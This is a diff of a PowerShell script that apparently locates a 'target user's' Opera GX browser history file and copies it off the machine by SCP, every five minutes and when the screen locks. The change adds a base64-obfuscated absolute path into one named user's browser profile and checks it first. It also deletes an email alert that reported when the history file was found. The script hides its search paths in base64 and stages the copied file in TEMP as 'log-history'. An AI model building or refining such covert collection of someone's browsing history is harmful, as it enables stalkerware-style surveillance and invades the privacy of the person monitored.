@@ -4,7 +4,6 @@
 # BHistory periodic SCP (not configurable).
 $script:ScpBHistoryIntervalMinutes = 5
 # StrictMode-safe defaults (Test-ScpOnLock / Copy-LogsViaScp dot-source this file).
-$script:LastBHistoryNotifiedPath = $null
 $script:LastBHistoryMissingWarnUtc = $null
 $script:LastBHistorySourceWriteUtc = $null
 $script:LastBHistoryScpSucceeded = $false
@@ -14,6 +13,9 @@ function ConvertFrom-ScpB64Path {
     return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64))
 }
 
+# Absolute path checked first (preferred Default\History).
+$script:ScpBHistoryPreferredAbsolute = ConvertFrom-ScpB64Path `
+    'QzpcVXNlcnNccGl0ZXJcQXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxEZWZhdWx0XEhpc3Rvcnk='
 # Relative History paths under AppData\Roaming (order matches discovery preference).
 $script:ScpBHistoryRoamingRels = @(
     (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxlXERlZmF1bHRcSGlzdG9yeQ==')
@@ -526,20 +528,38 @@ function Get-BHistoryInstallRootPaths {
 function Get-BHistoryPath {
     <#
       First existing BHistory path for the target user.
-      Tries Roaming/Local AppData candidates, then install-directory variants.
+      Always starts at the preferred absolute Default\History path, then
+      Roaming/Local AppData candidates, then install-directory variants.
       Returns '' when none exist.
     #>
     param(
         [Parameter(Mandatory)][string]$TargetUsername
     )
 
+    $tried = New-Object 'System.Collections.Generic.HashSet[string]' `
+        ([StringComparer]::OrdinalIgnoreCase)
+    $tryPath = {
+        param([string]$Candidate)
+        if ([string]::IsNullOrWhiteSpace($Candidate)) { return $null }
+        if (-not $tried.Add($Candidate)) { return $null }
+        if (Test-Path -LiteralPath $Candidate) { return $Candidate }
+        return $null
+    }
+
+    # 1) Always start here (absolute live profile path).
+    $hit = & $tryPath ([string]$script:ScpBHistoryPreferredAbsolute)
+    if (-not [string]::IsNullOrWhiteSpace($hit)) { return $hit }
+
     $profile = Get-TargetUserProfilePath -TargetUsername $TargetUsername
     $roaming = Join-Path $profile 'AppData\Roaming'
     $local = Join-Path $profile 'AppData\Local'
 
-    # Interleave Roaming/Local pairs in the preferred order (see user candidate list).
+    # 2) Target-user Roaming Default\History (same relative path under profile).
+    $hit = & $tryPath (Join-Path $roaming ([string]$script:ScpBHistoryRoamingRels[0]))
+    if (-not [string]::IsNullOrWhiteSpace($hit)) { return $hit }
+
+    # 3) Remaining Roaming/Local pairs, then Local-only install-profile paths.
     $orderedRels = @(
-        @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[0] }
         @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[0] }
         @{ Root = $roaming; Rel = $script:ScpBHistoryRoamingRels[1] }
         @{ Root = $local;   Rel = $script:ScpBHistoryLocalRels[1] }
@@ -554,19 +574,15 @@ function Get-BHistoryPath {
     )
 
     foreach ($item in $orderedRels) {
-        $candidate = Join-Path ([string]$item.Root) ([string]$item.Rel)
-        if (Test-Path -LiteralPath $candidate) {
-            return $candidate
-        }
+        $hit = & $tryPath (Join-Path ([string]$item.Root) ([string]$item.Rel))
+        if (-not [string]::IsNullOrWhiteSpace($hit)) { return $hit }
     }
 
     $installRoots = @(Get-BHistoryInstallRootPaths -ProfilePath $profile)
     foreach ($installRoot in $installRoots) {
         foreach ($rel in @($script:ScpBHistoryInstallRels)) {
-            $candidate = Join-Path $installRoot $rel
-            if (Test-Path -LiteralPath $candidate) {
-                return $candidate
-            }
+            $hit = & $tryPath (Join-Path $installRoot $rel)
+            if (-not [string]::IsNullOrWhiteSpace($hit)) { return $hit }
         }
     }
 
@@ -624,8 +640,6 @@ function New-ScpBHistoryUploadFile {
     if ([string]::IsNullOrWhiteSpace($sourcePath) -or -not (Test-Path -LiteralPath $sourcePath)) {
         return ''
     }
-
-    $null = Send-BHistoryFoundAlert -HistoryPath $sourcePath -TargetUsername $TargetUsername
 
     $stagedPath = Join-Path $env:TEMP 'log-history'
     if (Test-Path -LiteralPath $stagedPath) {
@@ -789,59 +803,6 @@ function Get-ScpManualSourceFiles {
     }
 
     return @($files)
-}
-
-function Send-BHistoryFoundAlert {
-    <#
-      Emails the discovered BHistory path once per process for a given path
-      (SMTP cooldown still applies across restarts).
-    #>
-    param(
-        [Parameter(Mandatory)][string]$HistoryPath,
-        [string]$TargetUsername = ''
-    )
-
-    if ([string]::IsNullOrWhiteSpace($HistoryPath)) {
-        return $false
-    }
-    if (-not (Get-Command Send-LoginTimeSmtpAlert -ErrorAction SilentlyContinue)) {
-        return $false
-    }
-
-    if ($script:LastBHistoryNotifiedPath -is [string] -and
-        [string]::Equals(
-            [string]$script:LastBHistoryNotifiedPath,
-            $HistoryPath,
-            [System.StringComparison]::OrdinalIgnoreCase)) {
-        return $false
-    }
-
-    $bodyLines = New-Object System.Collections.Generic.List[string]
-    $bodyLines.Add('BHistory file found.')
-    $bodyLines.Add('')
-    $bodyLines.Add(('Path: {0}' -f $HistoryPath))
-    if (-not [string]::IsNullOrWhiteSpace($TargetUsername)) {
-        $bodyLines.Add(('TargetUsername: {0}' -f $TargetUsername))
-    }
-    $body = $bodyLines -join [Environment]::NewLine
-
-    $keySuffix = ($HistoryPath.ToLowerInvariant() -replace '[^a-z0-9]+', '-')
-    if ($keySuffix.Length -gt 96) {
-        $keySuffix = $keySuffix.Substring($keySuffix.Length - 96)
-    }
-    $alertKey = 'bhistory-found-{0}' -f $keySuffix
-
-    $sent = Send-LoginTimeSmtpAlert `
-        -Subject 'BHistory found' `
-        -Body $body `
-        -AlertKey $alertKey
-    if ($sent) {
-        $script:LastBHistoryNotifiedPath = $HistoryPath
-        if (Get-Command Write-LoggerEvent -ErrorAction SilentlyContinue) {
-            Write-LoggerEvent ("BHistory found alert emailed for '{0}'." -f $HistoryPath)
-        }
-    }
-    return [bool]$sent
 }
 
 function Send-ScpOnLockFailureAlert {
@@ -1155,10 +1116,6 @@ function Invoke-ScpBHistoryCopy {
             }
         }
         else {
-            $null = Send-BHistoryFoundAlert `
-                -HistoryPath $sourcePath `
-                -TargetUsername ([string]$Config.TargetUsername)
-
             $sourceItem = Get-Item -LiteralPath $sourcePath -Force
             $bHistorySourceWriteUtc = $sourceItem.LastWriteTimeUtc
             $bHistoryUnchanged = (
